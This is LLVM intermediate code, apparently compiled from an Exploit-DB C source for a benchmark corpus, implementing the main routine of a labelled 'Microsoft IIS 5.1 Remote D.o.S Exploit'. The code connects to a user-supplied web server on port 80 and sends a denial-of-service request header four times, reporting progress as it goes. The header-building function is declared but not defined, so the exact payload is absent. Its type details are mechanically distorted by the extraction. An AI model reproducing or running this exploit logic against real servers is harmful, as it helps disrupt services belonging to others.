; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1376.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1376.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32 }
%struct.sockaddr_in = type { i32, i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [194 x i8] c"\0A\0AMicrosoft IIS 5.1 Remote D.o.S Exploit by Kozan\0ABug Discovered by: Inge Henriksen\0AExploit Coded by: Kozan\0ACredits to ATmaCA, Inge Henriksen\0Awww.spyinstructors.com - kozan@spyinstructors.com\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"\0A\0AUsage:\09%s [WebSiteUrl]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"Winsock error!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [15 x i8] c"Socket error!\0A\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"Address resolve error!\0A\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"Please wait while connecting...\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"Connection failed!\0A\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"Connected.\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [51 x i8] c"Please wait while sending DoS request headers...\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"Sending %d. request...\0A\00", align 1
@.str.10 = private unnamed_addr constant [40 x i8] c"%d. DoS request header could not sent!\0A\00", align 1
@.str.11 = private unnamed_addr constant [20 x i8] c"%d. request sent.\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [24 x i8] c"Operation completed...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1000 x i8], align 16
  %11 = alloca [1000 x i8], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([194 x i8], [194 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %3, align 4
  br label %121

23:                                               ; preds = %2
  %24 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @lstrcpy(i8* %24, i8* %27)
  %29 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %30 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %31 = call i8* @HttpHeader(i8* %30)
  %32 = call i32 @lstrcpy(i8* %29, i8* %31)
  %33 = call i64 @WSAStartup(i32 257, i32* %6)
  %34 = icmp slt i64 %33, 0
  br i1 %34, label %35, label %38

35:                                               ; preds = %23
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %121

38:                                               ; preds = %23
  %39 = load i32, i32* @AF_INET, align 4
  %40 = load i32, i32* @SOCK_STREAM, align 4
  %41 = call i32 @socket(i32 %39, i32 %40, i32 0)
  store i32 %41, i32* %9, align 4
  %42 = load i32, i32* %9, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %47

44:                                               ; preds = %38
  %45 = load i32, i32* @stderr, align 4
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %45, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %121

47:                                               ; preds = %38
  %48 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %49 = call %struct.hostent* @gethostbyname(i8* %48)
  store %struct.hostent* %49, %struct.hostent** %7, align 8
  %50 = icmp eq %struct.hostent* %49, null
  br i1 %50, label %51, label %54

51:                                               ; preds = %47
  %52 = load i32, i32* @stderr, align 4
  %53 = call i32 (i32, i8*, ...) @fprintf(i32 %52, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %121

54:                                               ; preds = %47
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %56 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %55, i32 0, i32 0
  %57 = load %struct.hostent*, %struct.hostent** %7, align 8
  %58 = getelementptr inbounds %struct.hostent, %struct.hostent* %57, i32 0, i32 1
  %59 = load i32, i32* %58, align 4
  %60 = load %struct.hostent*, %struct.hostent** %7, align 8
  %61 = getelementptr inbounds %struct.hostent, %struct.hostent* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 4
  %63 = call i32 @memcpy(i32* %56, i32 %59, i32 %62)
  %64 = load i32, i32* @AF_INET, align 4
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %64, i32* %65, align 4
  %66 = call i32 @htons(i32 80)
  %67 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %66, i32* %67, align 4
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %69 = call i32 @memset(i32* %68, i8 signext 0, i32 8)
  %70 = load i32, i32* @stdout, align 4
  %71 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0))
  %72 = load i32, i32* %9, align 4
  %73 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %74 = call i32 @connect(i32 %72, %struct.sockaddr* %73, i32 4)
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %81

76:                                               ; preds = %54
  %77 = load i32, i32* @stderr, align 4
  %78 = call i32 (i32, i8*, ...) @fprintf(i32 %77, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %79 = load i32, i32* %9, align 4
  %80 = call i32 @closesocket(i32 %79)
  store i32 -1, i32* %3, align 4
  br label %121

81:                                               ; preds = %54
  %82 = load i32, i32* @stdout, align 4
  %83 = call i32 (i32, i8*, ...) @fprintf(i32 %82, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0))
  %84 = load i32, i32* @stdout, align 4
  %85 = call i32 (i32, i8*, ...) @fprintf(i32 %84, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %86

86:                                               ; preds = %112, %81
  %87 = load i32, i32* %12, align 4
  %88 = icmp slt i32 %87, 4
  br i1 %88, label %89, label %115

89:                                               ; preds = %86
  %90 = load i32, i32* @stdout, align 4
  %91 = load i32, i32* %12, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 (i32, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0), i32 %92)
  %94 = load i32, i32* %9, align 4
  %95 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %96 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %97 = call i32 @lstrlen(i8* %96)
  %98 = call i32 @send(i32 %94, i8* %95, i32 %97, i32 0)
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %107

100:                                              ; preds = %89
  %101 = load i32, i32* @stderr, align 4
  %102 = load i32, i32* %12, align 4
  %103 = add nsw i32 %102, 1
  %104 = call i32 (i32, i8*, ...) @fprintf(i32 %101, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.10, i64 0, i64 0), i32 %103)
  %105 = load i32, i32* %9, align 4
  %106 = call i32 @closesocket(i32 %105)
  store i32 -1, i32* %3, align 4
  br label %121

107:                                              ; preds = %89
  %108 = load i32, i32* @stdout, align 4
  %109 = load i32, i32* %12, align 4
  %110 = add nsw i32 %109, 1
  %111 = call i32 (i32, i8*, ...) @fprintf(i32 %108, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.11, i64 0, i64 0), i32 %110)
  br label %112

112:                                              ; preds = %107
  %113 = load i32, i32* %12, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %12, align 4
  br label %86

115:                                              ; preds = %86
  %116 = load i32, i32* @stdout, align 4
  %117 = call i32 (i32, i8*, ...) @fprintf(i32 %116, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0))
  %118 = load i32, i32* %9, align 4
  %119 = call i32 @closesocket(i32 %118)
  %120 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %121

121:                                              ; preds = %115, %100, %76, %51, %44, %35, %17
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @lstrcpy(i8*, i8*) #1

declare dso_local i8* @HttpHeader(i8*) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @memset(i32*, i8 signext, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @lstrlen(i8*) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
